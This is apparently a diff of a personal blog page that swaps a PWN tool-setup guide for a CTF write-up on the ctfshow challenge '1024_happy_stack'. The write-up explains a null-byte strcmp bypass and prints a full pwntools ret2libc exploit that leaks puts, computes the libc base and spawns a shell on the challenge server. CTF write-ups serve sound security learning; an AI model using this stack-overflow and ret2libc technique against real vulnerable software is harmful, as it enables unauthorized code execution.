@@ -157,7 +157,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                PWN环境搭建
+                                [PWN]1024_happy_stack
                             </h1>
                             
                                 <!--en-->
@@ -167,17 +167,15 @@
                                         「配枪朱丽叶 - 分部。」
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2021-06-25</a>
+                                Date: <a href="#">2021-07-22</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">1.5
+                                    href="#">1.4
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">281</a></span>
+                                    <span class="post-words">words:<a href="#">276</a></span>
                                     
                                         <span class="post-category">
                                 Category:
-                                
-                                <a href="https://shawr00t.github.io/XtLkpctuU/">学习笔记</a>
                                 
                                 <a href="https://shawr00t.github.io/HdcmhNKsB/">pwn</a>
                                 
@@ -188,73 +186,55 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>参考文档：https://github.com/leungbless/pwnVM-ovf</p>
-<h2 id="0x00-环境">0x00  环境</h2>
-<ul>
-<li>操作系统：Ubuntu 16.04</li>
-</ul>
-<h2 id="0x01-更换源">0x01 更换源</h2>
-<ul>
-<li>cd ~ &amp;&amp; mkdir .pip</li>
-<li>cd ~/.pip &amp;&amp; touch pip.conf</li>
-<li>sudo gedit pip.conf</li>
-</ul>
-<p>然后写入以下内容：</p>
-<pre><code>[global]
-index-url = https://pypi.tuna.tsinghua.edu.cn/simple
-[install]
-trusted-host=mirrors.aliyun.com
+                            <p>checksec：</p>
+<pre><code>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled
 </code></pre>
-<ul>
-<li>sudo apt-get update</li>
-<li>sudo apt-get upgrade</li>
-</ul>
-<h2 id="0x02-安装-gitgdb-和-gdb-multiarch同时安装-binfmt-用来识别文件类型">0x02 安装 git，gdb 和 gdb-multiarch，同时安装 binfmt 用来识别文件类型</h2>
-<ul>
-<li>sudo apt-get update</li>
-<li>sudo apt-get install git gdb gdb-multiarch</li>
-<li>sudo apt-get install &quot;binfmt*&quot;</li>
-</ul>
-<h2 id="0x03-安装gdb的插件pwndbg">0x03 安装gdb的插件pwndbg</h2>
-<ul>
-<li>git clone https://github.com/pwndbg/pwndbg</li>
-<li>cd pwndbg</li>
-<li>./setup.sh</li>
-</ul>
-<h2 id="0x04-安装pwntools">0x04 安装PwnTools</h2>
-<ul>
-<li>sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</li>
-<li>pip install -U setuptools</li>
-<li>pip install --upgrade pip</li>
-<li>pip install --upgrade pwntools<br>
-这里如果出现报错，尝试：</li>
-<li>wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</li>
-<li>python get-pip.py</li>
-<li>pip install --upgrade pwntools</li>
-</ul>
-<h2 id="0x05-安装ssh">0X05 安装ssh</h2>
-<ul>
-<li>sudo apt-get install ssh</li>
-</ul>
-<h2 id="0x06-安装ropgadget工具">0x06 安装ROPgadget工具</h2>
-<ul>
-<li>pip install ropgadget</li>
-</ul>
-<h2 id="0x07-安装qemu">0x07 安装qemu</h2>
-<ul>
-<li>sudo apt-get install qemu-user</li>
-</ul>
-<h2 id="0x08-安装libcsearcher用处-用来泄露libc库中函数的偏移的库">0x08 安装LibcSearcher(用处: 用来泄露libc库中函数的偏移的库)</h2>
-<ul>
-<li>git clone https://github.com.cnpmjs.org/lieanu/LibcSearcher.git</li>
-<li>cd LibcSearcher</li>
-<li>sudo python setup.py develop</li>
-</ul>
-<h2 id="0x09-安装32位程序依赖的环境">0x09 安装32位程序依赖的环境</h2>
-<ul>
-<li>sudo dpkg --add-architecture i386</li>
-<li>sudo apt-get -y install lib32z1 lib32ncurses5</li>
-</ul>
+<p>64位开启了NX保护，可以用ret2libc的方法，首先泄露出puts的真实地址，然后调用<code>system()</code>即可。<br>
+开头会对输入的字符进行<code>ctfshow()</code>函数的处理，该函数的内容如下：</p>
+<pre><code class="language-c">__int64 __fastcall ctfshow(const char *a1)
+{
+  return (unsigned int)strcmp(a1, &quot;36D&quot;);
+}
+</code></pre>
+<p>strcmp对接收的字符进行比较，遇到<code>\x00</code>会被截断，所以输入&quot;36D&quot;后，再输入'\x00'，即可绕过字符串比较。最终exp如下：</p>
+<pre><code class="language-python">from pwn import *
+
+elf = ELF('./pwn')
+
+local = 0
+if local == 1:
+    io = process('./pwn')
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+else:
+    io = remote('pwn.challenge.ctf.show',28175)
+    libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
+
+puts_got = elf.got['puts']
+puts_plt = elf.symbols['puts']
+main_addr = elf.symbols['main']
+rdi_addr = 0x0000000000400803
+ret = 0x000000000040028a
+payload = '36D\x00'+'a'*(0x380-4)+p64(0xdeadbeef)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
+io.recvuntil(&quot;qunzhu\n\n&quot;)
+io.sendline(payload)
+io.recvuntil(&quot;36D\n&quot;)
+puts_addr = u64(io.recv(6)+'\x00\x00')
+
+log.success(&quot;puts_addr:&quot;+hex(puts_addr))
+
+libc_base = puts_addr - libc.symbols['puts']
+system_addr = libc_base + libc.symbols['system'] 
+bin_addr = libc_base + libc.search('/bin/sh').next()
+payload2 = '36D\x00'+'a'*(0x380-4)+p64(0xdeadbeef)+p64(ret)+p64(rdi_addr)+p64(bin_addr)+p64(system_addr)
+io.recvuntil(&quot;qunzhu\n\n&quot;)
+io.sendline(payload2)
+
+io.interactive()
+</code></pre>
 
                         </div>
                         
@@ -269,7 +249,7 @@ trusted-host=mirrors.aliyun.com
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://shawr00t.github.io/pwn-huan-jing-da-jian/">https://shawr00t.github.io/pwn-huan-jing-da-jian/</a></span>
+                                                <span><a href="https://shawr00t.github.io/pwn1024_happy_stack/">https://shawr00t.github.io/pwn1024_happy_stack/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -284,9 +264,9 @@ trusted-host=mirrors.aliyun.com
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/pwn-huan-jing-da-jian/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/pwn-huan-jing-da-jian/&sharesource=qzone&title=PWN环境搭建&pics=https://shawr00t.github.io/images/avatar.png?v=1626935746515&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/pwn-huan-jing-da-jian/&sharesource=weibo&title=PWN环境搭建 + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1626935746515 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/pwn1024_happy_stack/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/pwn1024_happy_stack/&sharesource=qzone&title=[PWN]1024_happy_stack&pics=https://shawr00t.github.io/images/avatar.png?v=1626935746515&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/pwn1024_happy_stack/&sharesource=weibo&title=[PWN]1024_happy_stack + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1626935746515 "><i class="fa fa-weibo "></i></a>
                                                         
                                                             <div class="reward ">
                                                                 <div class="reward-button ">&yen;
@@ -304,10 +284,6 @@ trusted-host=mirrors.aliyun.com
                                                                         <span class="tag ">
                         
                         
-                        <a href="https://shawr00t.github.io/XtLkpctuU/">#
-                                                学习笔记
-                                                    </a>
-                                                    
                         <a href="https://shawr00t.github.io/HdcmhNKsB/">#
                                                 pwn
                                                     </a>
@@ -325,11 +301,11 @@ trusted-host=mirrors.aliyun.com
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://shawr00t.github.io/gong-fang-shi-jie-hello_pwn/">
-                                                                                            [攻防世界]hello_pwn
-                                                                                        </a>
-                                                                                        
                                                                                             
+                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/buuctfciscn_2019_c_1/">
+                                                                                                    [BUUCTF]ciscn_2019_c_1
+                                                                                                </a>
+                                                                                                
                                                                                 </section>
                     </article>
                 </div>
